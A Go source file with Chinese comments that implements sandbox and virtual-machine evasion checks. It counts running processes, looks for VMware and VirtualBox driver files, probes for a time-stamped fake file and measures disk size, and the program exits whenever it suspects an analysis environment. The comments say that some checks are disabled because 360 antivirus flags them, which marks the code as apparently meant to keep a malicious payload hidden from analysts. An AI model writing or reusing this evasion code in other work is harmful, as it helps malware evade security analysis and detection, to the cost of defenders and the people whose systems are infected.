package checkSandbox

import (
	"os"
	"strconv"
	"syscall"
	"time"
	"unsafe"
)

type ulong int32
type ulong_ptr uintptr

type PROCESSENTRY32 struct {
	dwSize              ulong
	cntUsage            ulong
	th32ProcessID       ulong
	th32DefaultHeapID   ulong_ptr
	th32ModuleID        ulong
	cntThreads          ulong
	th32ParentProcessID ulong
	pcPriClassBase      ulong
	dwFlags             ulong
	szExeFile           [260]byte
}
/*
查看进程数
 */
func checkProcessNum()  bool{
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	CreateToolhelp32Snapshot := kernel32.NewProc("CreateToolhelp32Snapshot")
	pHandle, _, _ := CreateToolhelp32Snapshot.Call(uintptr(0x2), uintptr(0x0))
	if int(pHandle) == -1 {
		return false
	}
	Process32Next := kernel32.NewProc("Process32Next")
	num := 0
	for {
		var proc PROCESSENTRY32
		proc.dwSize = ulong(unsafe.Sizeof(proc))
		if rt, _, _ := Process32Next.Call(uintptr(pHandle), uintptr(unsafe.Pointer(&proc))); int(rt) == 1 {
			num++
		} else {
			break
		}
	}
	CloseHandle := kernel32.NewProc("CloseHandle")
	_, _, _ = CloseHandle.Call(pHandle)
	if num <= 20{
		os.Exit(0)
	}
	return true
}
/*
查看文件是否存在
*/
func Exists(path string) bool {
	_, err := os.Stat(path)    //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
/*
根据文件查看是否是虚拟机环境
 */
func virtual() {
	var arrays [20]string= [20]string{
		"C:\\windows\\System32\\Drivers\\Vmmouse.sys",
		"C:\\windows\\System32\\Drivers\\vmtray.dll",
		"C:\\windows\\System32\\Drivers\\VMToolsHook.dll",
		"C:\\windows\\System32\\Drivers\\vmmousever.dll",
		"C:\\windows\\System32\\Drivers\\vmhgfs.dll",
		"C:\\windows\\System32\\Drivers\\vmGuestLib.dll",
		"C:\\windows\\System32\\Drivers\\VBoxMouse.sys",
		"C:\\windows\\System32\\Drivers\\VBoxGuest.sys",
		"C:\\windows\\System32\\Drivers\\VBoxSF.sys",
		"C:\\windows\\System32\\Drivers\\VBoxVideo.sys",
		"C:\\windows\\System32\\vboxdisp.dll",
		"C:\\windows\\System32\\vboxhook.dll",
		"C:\\windows\\System32\\vboxoglerrorspu.dll",
		"C:\\windows\\System32\\vboxoglpassthroughspu.dll",
		"C:\\windows\\System32\\vboxservice.exe",
		"C:\\windows\\System32\\vboxtray.exe",
		"C:\\windows\\System32\\VBoxControl.exe",
	}
	for i := 0; i < len(arrays); i++ {
		if arrays[i] != ""{
			if Exists(arrays[i]){
				os.Exit(0)
			}
		}
	}
}
/*
检查是否任意文件存在,沙盒可能提供虚拟文件
 */
func anyFile()  {
	timeUnix := time.Now().Unix()
	file := "C:\\windows\\System32\\" + strconv.FormatInt(timeUnix,10)
	if Exists(file){
		os.Exit(1)
	}
}
/*
检查磁盘大小来判读是否为虚拟环境
 */
func checkDisk()  {
	h := syscall.MustLoadDLL("kernel32.dll")
	c := h.MustFindProc("GetDiskFreeSpaceExW")
	lpFreeBytesAvailable := int64(0)
	lpTotalNumberOfBytes := int64(0)
	lpTotalNumberOfFreeBytes := int64(0)
	c.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("C:"))),
		uintptr(unsafe.Pointer(&lpFreeBytesAvailable)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfBytes)),
		uintptr(unsafe.Pointer(&lpTotalNumberOfFreeBytes)))
	if lpTotalNumberOfBytes/1024/1024/1024 < 45{
		os.Exit(0)
	}
}
func CheckSandbox()  {
	//查看进程数 是否小于20
	checkProcessNum()
	//查看是否是虚拟机环境 判读系统文件是否存在 360会报毒选择使用
	//virtual()
	//是否任意文件存在 沙盒是否虚拟任意文件 360会报毒选择使用
	//anyFile()
	//检查系统盘大小 是否大于45 认为小于45g为沙盒虚拟环境影子系统
	checkDisk()
}
